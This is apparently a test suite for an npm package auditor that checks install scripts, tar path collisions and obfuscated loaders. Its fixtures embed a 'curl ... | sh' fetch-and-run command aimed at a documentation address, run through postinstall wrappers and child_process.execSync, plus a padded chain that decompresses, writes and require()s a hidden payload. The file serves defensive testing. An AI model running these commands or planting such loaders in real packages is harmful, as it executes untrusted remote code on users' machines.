import assert from "node:assert/strict";
import { describe, test } from "node:test";
import { gzipSync } from "node:zlib";
import { auditTarball, runRules } from "../src/index.js";
import type { AuditInput, PackageFile } from "../src/types.js";

// Core review round 3: unknown wrappers, per-interpreter inline flags, every
// code operand, tar-reading path collisions, template-literal require.

const CURL_SH = "curl -s http://198.51.100.1/x | sh"; // RFC 5737 documentation address

function tarBytes(entries: { name: string; data: string }[]): Buffer {
  const blocks: Buffer[] = [];
  for (const e of entries) {
    const data = Buffer.from(e.data);
    const h = Buffer.alloc(512);
    h.write(e.name, 0, 100, "utf8");
    h.write("0000644\0", 100);
    h.write("0000000\0", 108);
    h.write("0000000\0", 116);
    h.write(data.length.toString(8).padStart(11, "0") + "\0", 124);
    h.write("00000000000\0", 136);
    h.write("        ", 148);
    h.write("0", 156);
    h.write("ustar\0" + "00", 257);
    let sum = 0;
    for (const b of h) sum += b;
    h.write(sum.toString(8).padStart(6, "0") + "\0 ", 148);
    blocks.push(h, data, Buffer.alloc((512 - (data.length % 512)) % 512));
  }
  blocks.push(Buffer.alloc(1024));
  return gzipSync(Buffer.concat(blocks));
}

function file(path: string, content: string): PackageFile {
  return { path, content, size: Buffer.byteLength(content), changed: false };
}
function inputFor(files: Record<string, string>, pkgJson?: unknown): AuditInput {
  const list = Object.entries(files).map(([p, c]) => file(p, c));
  if (pkgJson !== undefined) list.push(file("package/package.json", JSON.stringify(pkgJson)));
  return {
    meta: {
      name: "probe", version: "1.0.0", author: null, maintainers: [], license: null,
      hasInstallScripts: false, signature: "unknown", provenance: "unknown", integrity: null,
      unpackedSize: 0, fileCount: list.length,
    },
    files: list,
    mode: "full",
  };
}
const crit = (files: Record<string, string>, cmd: string) =>
  runRules(inputFor(files, { scripts: { postinstall: cmd } }))
    .filter((x) => x.ruleId === "install-scripts" && x.severity === "critical");
const meta = { name: "demo", version: "1.0.0", author: null, maintainers: [] as string[], license: null, hasInstallScripts: false };

describe("unknown command words do not hide scripts", () => {
  test("`sudo node evil.js`, `timeout 5 sh evil.sh`, `xargs sh evil.sh`", () => {
    for (const [name, cmd] of [
      ["package/evil.js", "sudo node evil.js"],
      ["package/evil.sh", "timeout 5 sh evil.sh"],
      ["package/evil.sh", "xargs sh evil.sh"],
      ["package/evil.py", "nice -n 5 python3 evil.py"],
    ] as const) {
      assert.equal(crit({ [name]: `${CURL_SH}\n` }, cmd).length, 1, cmd);
    }
  });

  test("data names stay unscanned: `node generate.js README.md`", () => {
    assert.equal(crit({ "package/generate.js": "console.log(1)\n", "package/README.md": `${CURL_SH}\n` }, "node generate.js README.md").length, 0);
    assert.equal(crit({ "package/generate.js": "console.log(1)\n", "package/README.md": `${CURL_SH}\n` }, "sudo node generate.js README.md").length, 0);
  });
});

describe("inline-code flags are per interpreter", () => {
  test("`sh -e evil.sh` and `bash -eu evil.sh` are flagged (-e is errexit in a shell)", () => {
    for (const cmd of ["sh -e evil.sh", "bash -eu evil.sh"]) {
      assert.equal(crit({ "package/evil.sh": `${CURL_SH}\n` }, cmd).length, 1, cmd);
    }
  });

  test("`sh -c \"echo hi\"` with a benign README is not critical", () => {
    assert.equal(crit({ "package/README": "docs\n" }, 'sh -c "echo hi"').length, 0);
  });

  test("after an inline flag the remaining operands are still scanned", () => {
    assert.equal(crit({ "package/evil.sh": `${CURL_SH}\n` }, "sh -ec 'echo hi' evil.sh").length, 1);
    assert.equal(crit({ "package/evil.py": `${CURL_SH}\n` }, "python3 -c 'x' evil.py").length, 1);
  });

  test("inline flags per interpreter: python -c and php -r take code, extension-less operands after it are data", () => {
    assert.equal(crit({ "package/README": `${CURL_SH}\n` }, "python3 -c 'print(1)' README").length, 0);
    assert.equal(crit({ "package/README": `${CURL_SH}\n` }, "php -r 'echo 1;' README").length, 0);
  });
});

describe("every code-extension operand is scanned", () => {
  test("`node a.js evil.js` scans both", () => {
    const f = crit({ "package/a.js": "process.env.X\n", "package/evil.js": `${CURL_SH}\n` }, "node a.js evil.js");
    assert.equal(f.length, 1);
    assert.match(f[0]!.message, /downloads from the network/);
    assert.match(f[0]!.message, /reads environment variables/);
  });
});

describe("Windows-reading copy shadowing a real path", () => {
  test("`package/x.js` plus `package\\x.js` with different content is manifest-confusion and blocks", async () => {
    const tarball = tarBytes([
      { name: "package/package.json", data: JSON.stringify({ name: "demo", version: "1.0.0" }) },
      { name: "package/x.js", data: "// benign\n" },
      { name: "package\\x.js", data: `require("child_process").execSync("${CURL_SH}")\n` },
    ]);
    const report = await auditTarball({ meta, tarball });
    const f = report.findings.find((x) => x.ruleId === "manifest-confusion");
    assert.ok(f, "manifest-confusion expected");
    assert.match(f.message, /collision between tar readings/);
    assert.equal(report.verdict, "block");
  });

  test("a lone backslash entry with no colliding path is not a collision", async () => {
    const tarball = tarBytes([
      { name: "package/package.json", data: JSON.stringify({ name: "demo", version: "1.0.0" }) },
      { name: "package\\y.js", data: "// benign\n" },
    ]);
    const report = await auditTarball({ meta, tarball });
    assert.ok(!report.findings.some((x) => x.ruleId === "manifest-confusion"));
  });
});

describe("overflow fallback counts a template-literal require()", () => {
  test("pad + read, decode, write and require(`${dir}/p`) stays critical and blocks", async () => {
    const chain = `
const fs=require('fs'),zlib=require('zlib'),os=require('os');
const dir=os.tmpdir();
const c=fs.readFileSync(__dirname+'/intro.node');
const b=zlib.gunzipSync(c);
fs.writeFileSync(dir+'/p',b);
require(\`\${dir}/p\`);`;
    const pad = `${";".repeat(2_000_001)}\n`;
    const tarball = tarBytes([
      { name: "package/package.json", data: JSON.stringify({ name: "demo", version: "1.0.0", main: "index.js" }) },
      { name: "package/index.js", data: pad + chain },
    ]);
    const report = await auditTarball({ meta, tarball });
    assert.ok(report.findings.some((f) => f.ruleId === "native-payload-loader" && f.severity === "critical"));
    assert.equal(report.verdict, "block");
  });
});
